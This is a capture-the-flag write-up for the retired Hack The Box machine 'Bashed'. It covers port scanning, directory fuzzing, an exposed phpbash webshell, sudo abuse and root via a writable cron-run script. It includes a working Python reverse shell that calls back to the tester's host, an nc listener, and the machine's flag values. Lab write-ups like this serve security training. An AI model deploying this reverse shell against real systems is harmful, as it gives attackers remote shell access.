---
layout: writeup
name: "Bashed"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
os: "Hack The Box"
date: 2025-11-12
pwned: true
---

# 🧪 Machine Name: `Bashed`

**Platform:** Hack The Box  
**IP Address:** `10.10.10.68`  
**Difficulty:** Easy Linux  

---

## 🧭 Overview

Bashed is a fairly easy machine focused on web fuzzing and identifying exposed files and services. The box is a great example of privilege escalation via exposed scripts and improper sudo permissions. Enumeration is key, as initial foothold is obtained through an exposed phpbash webshell.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- 10.10.10.68 --min-rate 10000
```

```bash
nmap -p 80 10.10.10.68 -sCV -oN nmapscan
```

- Only port **80** open → Apache 2.4.18  
- Site title: *Arrexel's Development Site*

---

## 🕵️ Web Enumeration

- Browsing `http://bashed.htb` → exposed **phpbash** script in development.
- Discovered via manual browsing and **dirsearch**:

```bash
dirsearch -u http://bashed.htb
```

- Interesting dirs: `/dev/` → **phpbash.php** shell

Also verified with **gobuster**:

```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

- `/dev/phpbash.php` → initial webshell as **www-data**.

---

## 🎯 Foothold

- Accessed `/dev/phpbash.php` and spawned interactive shell:

```bash
whoami
# www-data
```

- Browsed `/home` → found users:

```
/home/arrexel
/home/scriptmanager
```

- Grabbed user flag:

```bash
cat /home/arrexel/user.txt
af827e749b08685a006408eaf072b8f3
```

---

## 🚀 Privilege Escalation

- Checked **sudo -l** as www-data:

```bash
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

- Switched to **scriptmanager**:

```bash
sudo -u scriptmanager /bin/bash
```

- Located writable script `/scripts/test.py` → observed that it runs as **root**.

### Reverse shell for root:

Replaced `test.py` with reverse shell:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.26",80))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Started listener:

```bash
nc -nlvp 80
```

Gained **root** shell:

```bash
whoami
# root

cat /root/root.txt
249277f71cf2bb8e0ec15a570c8fdfdf
```

---

## 🧠 Lessons Learned

- Simple **web fuzzing** can reveal powerful footholds (phpbash).
- Always check **sudo permissions** — in this case, www-data → scriptmanager was key.
- Privileged scripts with poor controls can be abused for **easy root escalation**.

---

*Writeup by inksec*  
GitHub: [https://github.com/inkedqt](https://github.com/inkedqt)

---

### Featured Writeups Snippet

```markdown
- 🧪 [HTB: Bashed](https://github.com/inkedqt/ctf-writeups/tree/main/HTB/Retired/bashed)  
  Web fuzzing → PHPbash webshell → User enumeration → Sudo to scriptmanager → Privileged script abuse → Reverse shell as root
```

